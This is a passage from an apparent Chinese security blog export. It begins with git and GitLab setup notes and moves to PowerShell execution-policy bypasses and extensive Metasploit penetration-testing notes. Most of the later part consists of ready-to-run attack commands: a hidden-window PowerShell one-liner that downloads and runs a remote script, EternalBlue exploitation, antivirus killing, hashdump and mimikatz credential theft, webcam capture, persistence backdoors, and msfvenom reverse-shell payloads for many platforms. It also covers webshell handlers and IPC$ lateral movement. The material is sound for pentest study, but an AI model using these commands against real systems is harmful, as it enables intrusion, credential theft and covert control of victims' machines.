.git目录存放配置信息(使之成为git库)，删除此目录就是一个普通文件夹\n# 其中config文件包含远程服务器地址信息(写好之后以后就不用手动输入信息；)\n[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false\n\tlogallrefupdates = true\n[remote \"origin\"]\n\turl = xps@192.168.0.105:/git/web\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"master\"]\n\tremote = origin\n\tmerge = refs/heads/master\n\n```\n\n\n#### 常用git命令\n```bash\n# 查看状态\ngit status\n\n# 追加变更到git的追踪\ngit add .    # 所有文件\ngit add file_name    # 指定文件\n\n# 提交变更给本地git库\ngit commit -a -m \"第一次提交\"\n\n# 同步到服务器（orign等在config文件已经写好了）\n# 提交之前必须服务器的内容是最新的版本，先git pull, 再push\ngit push orign master\n\n# 从服务器更新\ngit pull    # 服务端数据存储结构与客户端不同(数据库)\n\n# 撤销文件的变更(不仅仅对文件，对版本也可撤销)\ngit checkout <file>    # 回退最近的版本\n\n# 比对来查看文件的修改变化\ngit diff index.html    \n# 内容(对比的两个文件)\n--- a/4.conf\n+++ b/4.conf\n\n\n########### 切回历史上任何一个版本\napt install tig    # 方法很多，这里使用了tig\ntig    # 直接查看历史版本(移动到版本上，下面会有版本号hash值)，回车会看到具体变更内容\n\ngit checkout ddwe23e353c0d6665406e7c07djaoid2d   # 切回到指定版本\n# 只是指针临时指向了之前的版本，没显示后面的版本(但是后面的版本还是存在的)\n\n# 如果验证没问题，先回到最新状态\ngit checkout master\n\n# 回滚(只是回滚那一个版本的所做的变更, 不是回退到那，也不影响之后的版本)  --> 从当前最新版本的基础山，去掉前面某一个版本中所做的变更\ngit revert master ddwe23e353c0d6665406e7c07djaoid2d\n\n\n```\n\n**不仅仅的对代码，对配置文件也可以**\n是个好习惯\n```bash\n# 例子 :apache的配置文件\ncp -rp /etc/apache2 /etc/apache2.bak\nmv /etc/apache2/* /git/apache2\nrm /etc/apache2    # 这里千万不能重启\nfind /git/apache2 -name '.?*' -prune -o -exec chown root:root {} + # 排除.git(.?*)，其他的都改为root\nln -s /git/apache2 /etc/apache2    # 做个软链接(可以让应用读取到配置文件)\nsystemctl reload apache2\n\n# 以后修改就在git仓库修改，并进行add和commit和push，以便出问题回滚\n```\n\n\n\n\n#### Github\n>开源项目可以使用，前面自己在服务器搭建的git服务器可以自己公司用(商用的肯定要自己内部建版本控制服务器)\n>机密&隐私信息不建议放到开源平台\n\n\n**创建并同步新库**\n```bash\n## 1.在本地新建(已有库)，然后关联到github仓库\necho \"# new\" >> README.md\ngit init\ngit add README.md\ngit commit -m \"first\"\ngit remote add origin https://github.com/xps/new.git    # 连接远程仓库，同步现有库\ngit pull    # 先把服务器的版本同步到本地，然后才能正常提交\ngit push -u origin master    # 提交到远程github仓库\n\n# 如果要用ssh协议， 要在github的仓库的setting的的Deploy Key\n# 然后本地 .ssd/id_rsa.pub 公钥粘贴上去\n# 然后就不用输入密码了\n\n\n## 2.在github新建，然后clone下来，再提交\n```\n\n\n#### GitHub pages\n通过github上传页面文件建站(目前只是静态的)\n```bash\n# 新建库名为： user_name.github.io\n# 现在本地创建已有库也行(参照同步到github库)\ngit clone https://github.com/user_name.github.io\ncd user_name.github.io/\necho \"hello world\" > index.html    # 可以在本地设置好页面(静态网站)，再上传\ngit add .\ngit commit -m \"init commit\"\ngit remote add origin https://github.com/user_name.github.io\ngit push -u origin master\n\n# 浏览器访问 https://user_name.github.io\n```\n\n\n#### SSH Key连接库\n```bash\nClonr or Download ->    CLone with SSH\nSetting ->    Deploy keys    -> Add\ngit clone git @github.com:xps/test.git\n```\n\n\n\n#### GitLab\nGitLab是开源的Git库Web界面（包含团队写协作工具 GitLab mattermost ->即时聊天沟通的）\n基于Ruby语言开发的Web应用程序\n所有组件全部打包集成（Postgresql, redis, nginx, logrotate, Sidekiq, Unicron）\n如果想要要支持MySQL数据库，社区版需要手动安装\n安装需求\n```bash\n最小：单核，1GB，适当存储空间(400MB)，100用户以下(建议双核、2GB以上)\n```\n\n**安装**\n```bash\n### 集成安装方式\nhttps://packages.gitlab.com/gitlab/gitlab-ce/\n# ubuntu(安装软件源)\ncurl -s https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | sudo bash\n# 开始安装(等待时间比较长)\nsudo apt install gitlab-ce\n\n# 自动初始化配置\nsudo gitlab-ctl reconfigure\n\n# 查看状态\nsudo gitlab-ctl status\n\n# 然后就可以访问了， 设置初始root帐号密码\n# 默认是只有一个root管理员\n# 和github等的使用体验是类似的\n\n```\n\n\n**配置**\n```bash\n/etc/gitlab/gitlab.rb   # 配置文件\n\nexternal_url    # 指定访问域名(也可以启用https)\nletsencrypt 也集成了  # 免费https\ndatabase    # 指定外部PosgreSQL数据库\nemail    # 设置出站邮件服务器(注册帐号链接等)\n\n\nsudo gitlab-ctl reconfigure        # 每次修改后都要重新配置\nfitlab-ctl show-config    # 显示已经启用的配置\nsudo gitlab-ctl status\n```\n\n\n**常用命令**\n```bash\nsudo gitlab-ctl status   # 查看状态\nsudo gitlab-ctl stop     # 停止gitlab\nsudo gitlab-ctl start    # 启动gitlab\nsudo gitlab-ctl restart  # 重启gitlab\n\nsudo gitlab-ctl  tail    # 查看所有日志\nsudo gitlab-ctl tail nginx/gitlab_access.log    # 查看nginx访问日志\nsudo gitlab-ctl tail postgresql    # 查看postgresql访问日志\n```\n\n\n**新建用户帐号**\nF1: 管理员登录 -> 扳手图标(全局设置) -> 用户\n```bash\n普通用户的创建库的限制一般设置为0\n\n创建帐号的时候不能设置密码(是发送邮件他自己设置)，但是创建完成之后再次点击用户就可以修改密码了\n```\n\nF2: 默认是支持普通用户自助注册的(不建议，因为一般是在企业内部使用)\n```bash\n# 限制/禁用普通用户自助注册\n管理员登录 -> 扳手图标(全局设置) -> Setting\nSign-up Restrictions(注册限制)  -> Sign-up enable 不选中   # 禁用自助；只允许手动创建帐号\nSend confirmation email on sign-up    -> 指定邮箱域名白名单(*.lab.com)\nDoamin Blacklist -> 设置黑名单\n```\n\n\n**建库**\n设置(私有,内部,公开) -> 选择库成员(设置-->成员->设置用户权限和期限)，clone，同步\n默认是http协议访问，可以改为ssh公钥访问\n\n\n\n一定程度上支持中文(settings -> Perferences -> Language)\n\n\n普通用户第一次登录也要重新设置密码，\n就可以在本地clone项目库，\n然后就可以同步了(其他步骤同github)\n\n\n**用户设置 -- Profile**\n```bash\n邮件，名称(给别人看，方式穷举暴力破解)\n# 用户资料\nfull name 修改\nemail 修改, 且不公开\n```\n\n**帐号名称**\n```bash\nAccount -> root修改为别的  # 安全\n# 帐号(路径这里才是)\n修改得隐蔽一点\n```\n\n\n**SSH Key**\n```bash\nssh-keygen    # 现在本机生成公钥\n~/.ssh/id_rsa.pub    # 生成的公钥\nAdd Key        # 拷贝公钥到gitlab的key的地方\n```\n\n\n**禁止普通用户建库**\n```bash\n设置用户可创建0个库(Project)\n\nAccoumt and Limit Settings -> Default projects limit -> 0\n```\n\n\n**Let's Encrypt证书更新**\n```bash\n# 自动更新时间\nvim /etc/gitlab/gitlab.rb\nletsencrypt['auto_renew'] = true    # 开启自动更新\nletsencrypt['auto_renew_hour'] = \"12\"  # 每12个小时\nletsencrypt['auto_renew_minute'] = \"30\" # 30分钟\nletsencrypt['auto_renew_day_of_month'] = \"*/7\"  # 每隔7天\n```\n\n","tags":["GitLab"],"categories":["Linux"]},{"title":"PowerShell执行策略的简单绕过","url":"%2Fposts%2F15127%2F","content":"  \n#### 执行策略\n```bash\nGet-ExecutionPolicy   #查看当前策略\n\n# 四种\n- Restricted        #脚本不能运行（默认）\n- RemoteSigned      #本地创建的脚本可以运行，但从网上下载的脚本不能运行\n- AllSigned         #仅当脚本由信任的发布者签名时才能运行\n- Unrestricted      #允许所有的脚本运行\n\n# 设置PowerShell执行策略\nSet-ExecutionPolicy <策略名>\n```\n  \n#### 绕过\n1.\n```\n# 先设置当前用户的执行策略为Unrestricted，也算是去更改了当前的全局策略\nSet-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted \n# 再执行脚本\n```\n\n2.\n```\n# 或是下面这种，-Windowstyle hidden 可以让我们的执行无任何弹窗, -NoProfile不加载当前用户配置\npowershell.exe -executionpolicy bypass -Windowstyle hidden -Noninteractive -nologo -NoProfile -File xxx.sp1\n\n# Noexit  执行结束不退出shell(对键盘记录等脚本非常有用)\n```\n\n3.\n```\n# 绕过本地权限执行\nPowerShell.exe -ExecutionPolicy Bypass -File xxx.sp11\n```\n\n4.\n```\n# 用IEX下载远程PS1脚本绕过\nPowerShell.exe -ExecutionPolicy Bypass  -Windowstyle hidden -Noninteractive -NoProfile IEX(New-ObjectNet.WebClient).DownloadString(\"http://xxxxx.xxx.ps1\");[Parameters]\n```\n\n5.更多执行策略绕过: \n```\nhttps://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy\n```\n","tags":["PowerShel"],"categories":["渗透测试"]},{"title":"Metasploit初学-散记","url":"%2Fposts%2F48093%2F","content":"\n# MSF\n>最牛X的地方是：支持整个渗透测试过程\n\n## <font color=red> 理论方面</font>\n![](http://image.xpshuai.cn/msf_1.png)\n\n\n#### 技术架构\n**1.辅助模块（auxiliary）**\n包含了扫描、嗅探、指纹识别、网络欺骗等相关功能模块\n![](http://image.xpshuai.cn/msf_2.png)\n\n**2.渗透攻击模块(exploits)**\n利用程序，针对漏洞、权限进行利用，是主要使用的模块\n![](http://image.xpshuai.cn/msf_3.png)\n\n**3.攻击载荷模块(payload)**\n用于在目标系统中运行任意命令或者执行特定代码，主要用于shell获取\n![](http://image.xpshuai.cn/msf_5.png)\n\n**4.空指令模块(nops)**\n![](http://image.xpshuai.cn/msf_5.png)\n\n**5.编码器模块(encoders)**\n![](http://image.xpshuai.cn/msf_6.png)\n\n**6.后渗透攻击模块(post)**\n![](http://image.xpshuai.cn/msf_7.png)\n\n**7.免杀模块(evasion)**\n\n\n\n\n\n\n\n#### 接口\nMSF有四种接口对外提供：`msfconsole`, `msfcli`,  `msfgui`,  `msfweb`\n\n\n\n#### 为什么要使用Metasploit\n![](http://image.xpshuai.cn/msf_8.png)\n开发版是没有生成报告的功能的（商业版才有），但是开发版的脚本更多，每个版本各有利弊\n\n1. 情报搜集阶段\n![](http://image.xpshuai.cn/msf_9.png)\n有数据库\n\n2. 威胁建模阶段\n![](http://image.xpshuai.cn/msf_10.png)\n\n3. 漏洞分析阶段\n![](http://image.xpshuai.cn/msf_11.png)\n\n4. 后渗透攻击模块\n![](http://image.xpshuai.cn/msf_13.png)\n\n5. 报告生成模块\n![](http://image.xpshuai.cn/msf_13.png)\n\n---------------------------------------------\n\n\n## <font color=red> 使用MSF</font>\n#### 准备使用\n**启动MSF**\n`msfconsole`\n可以配置数据库等\n\n**更新MSF**\n```bash\napt-get update\napt-get install metasploit-framework\n```\n\n**软件安装目录**\n```bash\n/usr/share/metasploit-framework\n# 数据目录(其中一些字典和脚本我们用的时候可以拿)\n```\n\n**模块**\n一个模块就是一个rb脚本\n\n\n#### 情报搜集\n> 首先search 搜索有哪些可用的模块\n\n**1.网站敏感目录扫描：**\n```bash\n/usr/share/metasploit-framework/modules/auxiliary/scanner 里面自己看都有啥\n\n## 使用 brute_dirs, dir_listing, dir_Scanner等辅助模块来进行敏感目录扫描\n# 他们主要使用暴力猜解的方式工作，需要提供目录字典\n\n# 使用模块\nuse auxiliary/scanner/http/dir_scanner\n# 查看详细信息\ninfo\n# 查看需要设置的参数\nshow options   \n\n# 设置参数（取消设置参数是 unset）\nset RHOTS 192.168.0.101\nset PATH /cms/\n# 攻击\nexploit\n# 返回上一级退出当前模块\nback\n\n# 两个可选命令\nsetg, unsetg  # 用于在msfconsole中设置或取消设置全局性的参数，从而避免重复输入相同的值\n```\n\n使用常用的辅助模块进行服务扫描(`search scanner`)\n\n**2.主机发现**\n```bash\n## 用于主机发现的辅助模块，位于 modules/auxiliary/scanner/discovery\nuse /auxiliary/scanner/discovery/arp_sweep\n```\n![](http://image.xpshuai.cn/msf_14.png)\n\n还是nmap速度快, 可以直接在msf中使用`nmap`\n\n**3.端口扫描**\nsearch  portscan\n```bash\nauxiliary/scanner/portscan/ack\nauxiliary/scanner/portscan/syn  # 推荐这个(速度快，准确，不易被发现)\nauxiliary/scanner/portscan/xmas\nauxiliary/scanner/portscan/ftpbounce\nauxiliary/scanner/portscan/tcp\n\nuse ......\nshow options\nset xxx\n```\n![](http://image.xpshuai.cn/msf_15.png)\n\n**4.探测服务详细信息**\n![](http://image.xpshuai.cn/msf_16.png)\n\n\n**5.服务查点**\n用户服务扫描和查点的工具，通常以`[server_name]_version`命名\n\n- telnet服务查点(查哪些主机开了telnet服务，而namp是查看某主机开放了哪些服务)\n![](http://image.xpshuai.cn/msf_17.png)\n\n- SSH服务查点\n```bash\nuse auxiliary/scanner/ssh/ssh_version\n# 口令爆破\nuse auxiliary/scanner/ssh/ssh_login\n```\n\n- MSSQL服务查点\n```bash\nuse auxiliary/scanner/mssql/mssql_version\n```\n\n\n\n**永恒之蓝实践**\n```bash\n# 先扫描是否存在\nuse auxiliary/scanner/smb/ms17_010_eternalblue\n...\n\n# 载利用攻击模块\nuse exploit/windows/smb/ms17_010_eternalblue\nset payload windows/x64/meterpreter/reverse_tcp\nset RHOST ...\n...\nexploit\n```\n\n\n#### 漏洞利用\n收集完信息后，选择正确的exploit，payload\n\n这里假设是Samba\n`info exploit/multi/samba/usermap_sript`,  可以查看到利用成功率`Rank`越高，成功率越大\n`use exploit/multi/samba/usermap_sript`\n`show options`\n`set PAYLOAD cmd/unix/reverse`\n... ... \n\n\n#### Bypass UAC\n```bash\nuse exploit/windows/local/bypassuac\nset session 1\nrun\n```\n\n\n#### Meterpreter（属于后渗透攻击）\n>Metasploit框架中的一个扩展模块\n\n作为`溢出成功以后的`攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接\nhttps://www.cnblogs.com/backlion/p/9484949.html\n```bash\nMeterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。\n\n\n# 优势\n- 纯内存工作模式，不需要对内存进行写入操作\n- 使用加密通信协议，且可以同时与几个信道通信\n- 在被攻击进程内工作，不需要创建新的进程\n- 易于在多进程之间迁移\n- 平台通用\n```\n\n**进程迁移**\n刚获取Meterpreter shell的时候，是脆弱的(用户随时可能关闭)，所以第一时间是移动shell，把它和一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作(更不易被发现)\n```bash\nps    # 获取目标正在运行的进程\ngetpid    # 查看Meterpreter shell的进程号\nmirate 448    # 把shell移动到PID为448的进程里(因为这里这个稳定，看情况来吧)\n\ngetpid  # 发现shell的进程迁移OK(原来的进程会自动关闭，如果没关闭就手动关掉：kill xxx_pid)\n\n# 自动迁移进程指令(系统会自动寻找合适的进程然后迁移)\nrun post/windows/manage/migrate\n```\n\n\n\n**常用命令**\n```bash\n########## 系统命令（收集系统信息）\nsysteminfo\t# 查看系统信息\nrun post/windows/gather/checkv    # 检查是否为虚拟机\nidletime    # 目标机器最近运行时间\n\nifconfig/ipconfig \t# 查看网卡信息\nroute\t# 查看路由信息，设置路由（做跳板用）\n\nbackground\t\t# 把会话放到后台，这个会话继续保持\nsessions     # 查看会话列表\nsessions -i 2\t# 进入切回会话2\n\ngetuid\t# 获取当前用户id权限\nrun post/windows/manage/killav # 关闭杀毒(其他命令自己探索)\nrun post/windows/manage/enable_rdp # 开启目标机器的远程桌面\n\nrun post/windows/manage/autoroute # 查看目标机的本地子网情况\n# 接着进行跳转\nbackground # 把当前终端隐藏在后台\nroute add 192.168.0.111 255.255.255.0 1  # 给指定会话id添加路由(可以添加其他地址到被攻陷的机器的路由表上，借助被攻陷的机器来攻击其他网络)\nroute print    # 查看路由添加结果\n# 接着查看\nrun post/windows/gather/enum_logged_on_users   # 列举当前有多少用户登录了主机\nrun post/windows/gather/enum_logged_on_users   # 继续列举安装在目标机器上的应用\nrun post/windows/gather/credentials/windows_autologin  # 很多用户习惯将计算机设置自动登录(抓取自动登录的密码)，如果看不到任何信息，就需要拓展插件Expia\nload espia # 先加载该插件\nscreengrab    # 就可以抓取此时目标机器的屏幕截图\nscreenshot    # 也是截屏\n\nwebcam snap  # 打开目标机器摄像头，拍摄一张照片\nwebcam_stream  # 开始摄像头(直播模式)，在浏览器输入给出的url发那个问即可\n\nshutdown\t   # 关机\n\nshell\t\t# 进入目标系统的shell下面\nexit        # 停止meterpreter会话（也可以停止shell并返回到meterpreter）\nquit\t\t# 关闭当前的Meterpreter会话，返回MSF终端\n\n\n\n\n\n########## 文件系统命令\npwd\t/   getwd  # 查看目标机器当前目录 \ngetlwd    # 查看本机当前目录 \ncd\t# 切换目录(注意\\的转义)\nls\t# 查看当前目录内容\nsearch\t-f *.txt\t  -d c: # 搜索文件（search -h 查看帮助） -d指定目录， -f搜索模式\nupload\t/var/www/test.txt c:\\  # 上传文件到目标机器的路径\ndownload\t c:\\test.txt  # 下载文件(默认保存到msf的目录)\ncat\t# 查看文件内容\nedit # 编辑文件\nexecute\t-f c:\\\\windows\\\\system32\\\\calc.exe  # 执行文件\n\n\nrun keylogrecorder   .... # 键盘记录？\n```\n\n###### 后渗透攻击：提权\n- 纵向提权\n- 横向提权\n\n```bash\n# 获取Meterpreter Shell之后，查看我们是什么权限\n# Meterpreter 下输入\nshell    # 进入目标的cmd\nwhoami /groups  # 查看当前权限\n## 下面就开始进行提权了\n# 用本地溢出漏洞，利用现成的exploit\n```\n\n**1.利用WMIC实战MS16-032本地溢出漏洞**\n```bash\n# WMIC是win一个命令行工具(交互模式/非交互模式)，不仅可管理本机还可管理域内所有远程主机(前提是有权限)，而被管理者不需要安装WMIC\n# WMIC在信息搜集和后渗透十分有用，可以调查目标机的进程，服务，用户，用户组，网络连接，硬盘信息，时区，操作系统信息等\n\n\n# 假设拿到了Meterpreter shell\ngetuid\ngetsystem    # 尝试提权，但是失败\n# 接着查看系统打了的补丁(传统方法：在目标cmd输入systeminfo，或查询C:\\windows\\补丁号.log)\n# 这里利用WMIC命令列出安装的补丁\nWMIC qfe get Caption,Description,HotFixID,IntalledOn\n# 找到打的补丁后，去找exp(然后将系统安装的补丁编号与提权exp编号比对，然后使用没有编号的exp进行提权)\n## 漏洞信息网站： 安全焦点， Expolit-DB\n# 接下来准备提权(把Meterpreter放到后台：background), 然后搜索ms16-032\nsearch ms16-032    # 如果找不到，可以试试升级：msfupdate  或者手动添加相应漏洞EXP\nuse exploit/windows/local/ms16_032_secondary_logon_handle_privsec\nset session 1\nrun\n# 会返回一个新的session，进入，执行getuid 反省是system权限了\n```\n\n**2.令牌窃取**\n令牌(Token)就是系统的`临时密钥`, 相当与账户密码，特点是随机性和不可预测  \n在假冒令牌攻击中需要使用`Kerberos`协议(一种网络认证协议，其设计目的是通过密钥系统为客户机/服务器应用程序提供强大的认证服务)\nKerberos工作机制：\nxxx待补充\n\n假冒令牌实战利用\n```bash\n# 假设已经拿到了Meterpreter shell\ngetuid\ngetsystem # 提权失败\n\nuse incognito\nlist token -u # 列出可用的token(会看到结果，根据Meterpreter shell的权限而定)\n# 假设从输出信息中看到了目标机器的..., 继续在incognito中执行\nimpersonate_token WIN7-TEST\\\\Administrator # 调用incognito中的这个impersonate_token 命令，来假冒Admin进行攻击(注意是两个反斜杠)\nshell\nwhoami  # 查看权限\n\n```\n\nHash攻击\n```bash\n###### 1.是使用Hashdump抓取密码\nhashdump   # 导出主机的sam数据库的hash\n\n# 另一个更强大的模块\nrun winsows/gather/smart_hashdump  # 若是win7,且开启了uac，就要使用绕过uac的模块再继续\n\n\n\n##### 2.使用Quarks PwDump抓取密码\nwin32下的一款工具，导出信息十分全面，支持系统版本十分广泛\n具体参数再查\nQuarksPwDump.exe -dh1 -o 1.txt\n# 还可配合在 Ntdsutil 工具到处DC的密码\n\nps: win的密码会加密存放在/windows/system32/config/sam\n\n\n\n##### 3.使用Windows Credentials Editor抓取密码\nWCE(Windows Credentials Editor)  功能强大，不过必须是管理员权限，还要主要免杀\n# 先上传wce到目标\nupload wce.exe\n# 在目标的shell下执行\nwce -w  # 便会成功提取明文管理员密码(默认是-l命令读取，-f强制安全方式读取，-g用来计算密码，-c制定会话来执行cmd，-v显示详细信息，-w最关键 --> 查看已登录的明文密码)\n\n\n\n##### 4.使用Mimikatz抓取密码\nmsf内置了Mimikatz成为一个peterpreter脚本集成\nload Mimikatz\nhelp Mimikatz\n# mimikatz_command # 可以让我们使用Mimikatz全部功能, 如(:: 请求某个模块可用的选项)\nmimikatz_command -f hash::\nmcv    # 抓取系统hash值\nkerberos    # 抓取系统票据\nwdigest   # 获取系统账户信息\nmimikatz_command -f samdump::hash  # 抓取hash\n\n## mimikatz 除了抓取hash，还有其他功能：比如 Handle模块，list\\kill进程，模拟用户令牌等\nmimikatz_command -f handle::\nmimikatz_command -f service::  # servvice模块可以对win的服务进行...\nmimikatz_command -f crypto::  # crypto可以列出 导出任何证书，以及存储在目标机器上的相应的私钥\n\n# mimikatz 也支持PowerShell调用\n脚本P228\n\n\n能在PowerShell中执行mimikatz，偷窃和注入凭证，伪造Kerbero票证创建，还有其他很多功能\n```\n\n\n\n###### 后渗透攻击：移植漏洞利用代码模块\n支持不同语言编写的模块移植进去，允许开发者开发自己的漏洞利用模块\n\n\nMS17-010 --> 微软SMB远程代码执行漏洞\n\n演示：移植MS17-010漏洞利用代码\n```bash\n# MS17-010 在msf中虽然有集成脚本，但是不适用于03系统，从网上自行下载\n# clone脚本到本地，把rb脚本复制到/usr/share/metasploit-framework/modules/exploits/windows/smb下\nraload all  # 然后在msf中重新加载脚本\n之后就能search到了，用use加载它\n# 开始\nmsfovenom 生成一个DLL文件(在下面set payload)\n然后设置该模块的参数\nrun\n\n\n\n```\n\n\n\n###### 后渗透攻击：后门\n提取完成之后，就需要留后门了  \n\n1.操作系统后门\n```bash\n##### 1.Cymothoa后门\n可以将ShellCode注入到现有进程的后门工具\n该后门能与被注入进程共存，且如果不检查内存是发现不了的\n该后门注入系统的某一进程，返回的是该进程相应的权限(并不需要root)， 但是关闭进程或重启，后门就会停止运行\n\nps -aux  # 查看程序的pid， Win下是 tasklist\n# -p指定目标进程的PID，-y指定payload服务端口，-s指定ShellCode编号(cymothoa -S 查看) \ncymothoa -p 862 -s 1 -y 5555\n# 连接后门\nnc -nvv 192.168.0.112 5555\n\n\n\n\n##### 2.Persistence后门\n使用安装自启动方式的持续型后门，可以用它创建注册表和文件\nrun persistence -h  # 查看命令选项\n# 创建持久型后门\nrun persistence -A -S -U -i 60 -p 4321 -r 162.168.0.112 \n# -A自动启动payload，-S系统启动时自动加载，-U用户登录时自动启动， -X开机时自动加载，-i回连时间间隔，-P监听端口号， -r 目标机器地址\n\nsessions  # 发现会话已成功获取\n```\n\n2.Web后门(WebShell)\n```bash\n# 中国菜刀，AntSword， Cknife， 冰蝎，Weevely(kali使用最多，但是只支持php)，msf也有自带的后门\n\n##### 1. Meterpreter 后门\nmsf中有一个叫 php meterpreter 的payload，里哟你他可以创建具有Meterpreter功能的php webshell\n# 使用msfvenom创建一个webshell\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=1234 -f raw > p.php\n# 上传webshell到目标机器\n# 本机运行 msf multi-handler 开始监听\nuse exploit/multi/handlers\nset payload php/meterpreter/reverse_tcp\n...\nrun\n# 访问webshell页面\n# 获得反弹的 Metasploit Shell\n\n\n\n##### 2. Aspx Meterpreter 后门\nmsf下的 shell_reverse_tcp 的payload，可以创建多个版本的具有meterpreter功能的Shellcode\n这里以aspx为例, 步骤和上面的那个大致相同\nshow payloads\nuse windows/shell_reverse_tcp\nset ...\nsave\n\ngenerate -h  # 查看帮助\ngenerate -t aspx  # 生成aspx版本的ShellCode\n# 保存内容到x.aspx，上传到服务器\n# 本地设置监听\nuse exploit/multi/handlers\nset payload windows/meterpreter/reverse_tcp\n...\nrun\n# 访问webshell页面\n# 获得反弹的 Metasploit Shell\n后续就可以进行提权等操作了\n```\n\n\n\n------------------\n\n\n#### msf基础命令\n```bash\nsearch ms17  # 查找\nuse exploit/multi/handler    # 使用\ninfo    # 查看信息\nshow expoits/payloads/options    # 显示可用信息\nexploit /run    # 执行\nback    # 返回上一级\nexploit -j     # 后台运行\nsessions    # 查看当前可用会话\nsession -i 1  # 连接某个会话\nsessions -K    # 杀死所有活跃会话\n```\n\n\n\n#### Meterpreter命令：\n```bash\ngetuid    # 查看用户名，从而查看当前会话具有的权限\nsysinfo    # 列出主机信息\ngetprivs    # 尽可能多地获取目标主机上的特权\ngetystem    # 通过各种攻击向量来提升到系统用户权限\nhashdump    # 导出目标主机中的口令哈希值\nscreenshot    # 屏幕截图\nbackground    # 将当前的meterpreter shell转为后台执行\nquit    # 关闭当前meterpreter会话，回到msf终端\n\nps    # 显示所有运行进程\nmigrate PID    # 迁移到制定的进程PID\nexecute -f cmd.exe -i  # 执行cmd.exe命令并进行交互\nshell    # 以所有可用令牌来进行一个交互的shell\n```\n\n\n#### msfvenom基础\n```bash\n# 参考：msf下的各种生成payload命令  http://www.cnblogs.com/backlion/p/6000544.html\n### 二进制\n# Linux\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf\n\n# Windows 生成exe程序\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.105 lport=4444 -f exe -o /var/www/html/payload.exe\n\n# Mac\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho\n\n\n### Web Payloads\n# PHP\nmsfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php\ncat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php\n\n# ASP\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp\n\n# JSP\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp\n\n# WAR\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war\n\n\n### Scripting Payloads\n# Python\nmsfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py\n\n# Bash\nmsfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh\n\n# Perl\nmsfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl\n\n\n### Shellcode:\n# Linux Based Shellcode\nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\n\n# Windows Based Shellcode\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\n\n# Mac Based Shellcode\nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>\n\n\n### Handler\nuse exploit/multi/handler\nset PAYLOAD <Payload name>\nset LHOST <LHOST value>\nset LPORT <LPORT value>\nset ExitOnSession false\nexploit -j -z\n```\n\n#### 反弹Shell\n```bash\n### 第一种(这个监听更综合一点)： use exploit/multi/hander\n# 1.msfvenom生成程序\n# 2.使用handler执行exp\n# 3.在目标机器运行msfvenom生成程序\n# 4.返回session\n\n\n\n### 第二种： use exploit/multi/script/web_delivery\n# 1.使用web_delivery返回脚本执行并加载exp\n# 2.在目标机器运行脚本\n# 3.返回session\n\n# Note: 这里要使用的payload与上面使用生成器生成的名字要一致\n```\n\n\n\n\n\n----------------------------------\n\n## 一些小思路\n\n#### 信息搜集\n当拿下第一天内网主机的权限(提权不了时)，就要以此服务器为跳板攻击其他服务器\n\n先进行网络/用户组/DC等的收集\n\n\n###### 获取另外一台服务器权限\n**若权限不够导致不能直接攻击域服务器**\n- 使用meterpreter当前拥有的权限添加到内网路由，进行弱口令扫描\n- 用Powershell对内网进行扫描\n- 架设Socks4a, 然后socks会自动进行内网扫描\n- 利用当前权限进行内网IPC$渗透\n- 其他\n\n通过分析，我们输入`net view`, 发现列举的机器选择一个和我们机器名相似的服务器试，成功率一般很高`net use \\\\WIN7_TEST2\\c$`\n\n\n使用经典的`IPC$入侵`（通过win默认启动的ipc共享来获得计算机控制权）：\n```bash\nnet use \\192.168.0.112\\ipc$   # 连接这个ip的ipc共享\ncopy srv.exe \\192.168.0.112\\ipc$  # 复制srv(免杀的payload)到目标\nnet time \\192.168.0.112  # 查看时间\nat \\192.168.0.112 18:18 srv.exe    # 用at命令在18点18分启动srv.exe (这里设置的时间要比主机时间快)\n# 如果没有 at命令，试试新的计划任务命令： schtask \n# 回到msf的handler进行监听，到时间会反弹shell\n然后进入这个新的主机，查看包括权限在内的信息, 也可以mimikatz抓密码: run /post/windows/gather/mimikatz\n也可以上传对应位数的mimikatz到该主机 upload /home/x64.exe 